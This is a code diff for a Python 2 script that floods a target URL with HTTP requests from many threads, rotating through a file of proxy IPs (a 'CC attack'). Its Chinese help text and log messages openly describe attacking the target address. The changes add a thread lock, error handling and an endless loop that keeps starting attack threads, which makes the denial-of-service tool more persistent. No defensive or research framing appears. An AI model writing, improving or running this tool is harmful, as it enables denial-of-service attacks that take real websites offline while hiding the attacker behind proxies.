@@ -9,6 +9,8 @@ User_Agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefo
 header = {}
 header['User-Agent'] = User_Agent
 thread_list = []
+"""线程锁"""
+mutex = threading.Lock()
 def main():
     parser = optparse.OptionParser(u"usage%prog -u '<url 攻击地址>' -t '<启动攻击的线程数>' -f '<可用的代理IP文件>'")
     parser.add_option('-u',dest="URL",type="string",help=u"要攻击的地址")
@@ -19,27 +21,36 @@ def main():
         URL = options.URL
         threadnum = options.threadnum
         filename = options.filename
-        f = open(filename,'r')
-        lines = f.readlines()
-        for ip in lines:
-            t = threading.Thread(target=cc,args=(URL,ip))
-            thread_list.append(t)
-        t = choice(thread_list)
-        print t
-        while True:
-            if len(threading.enumerate()) < threadnum:
-                t = choice(thread_list)
-                t.start()
-            else:
-                time.sleep(0.1)
+        try:
+            f = open(filename, 'r')
+            lines = f.readlines()
+        except Exception, e:
+            print u"%s不存在，请检查输入的文件名" % (filename)
+            exit(0)
+        finally:
+            f.close
+        while  True:
+            for ip in lines:
+                t = threading.Thread(target=cc,args=(URL,ip))
+                thread_list.append(t)
+            for t in thread_list:
+                if len(threading.enumerate()) < threadnum:
+                    t.start()
+                else:
+                    time.sleep(0.1)
 
 def cc(url,ip):
     req = urllib2.Request(url,headers=header)
-    print "使用代理IP%s攻击:%s" % (ip,url)
-    proxies={"http":ip}
-    proxy_s=urllib2.ProxyHandler(proxies)
+    mutex.acquire()
+    print "使用代理IP----------->%s" % (ip)
+    print "正在cc攻击----------->%s" % (url)
+    mutex.release()
+    proxy_s=urllib2.ProxyHandler({'http': ip})
     opener=urllib2.build_opener(proxy_s)
     urllib2.install_opener(opener)
-    content=urllib2.urlopen(req).read()
+    try:
+        content=urllib2.urlopen(req).read()
+    except Exception,e:
+        print e
 if __name__ == '__main__':
     main()
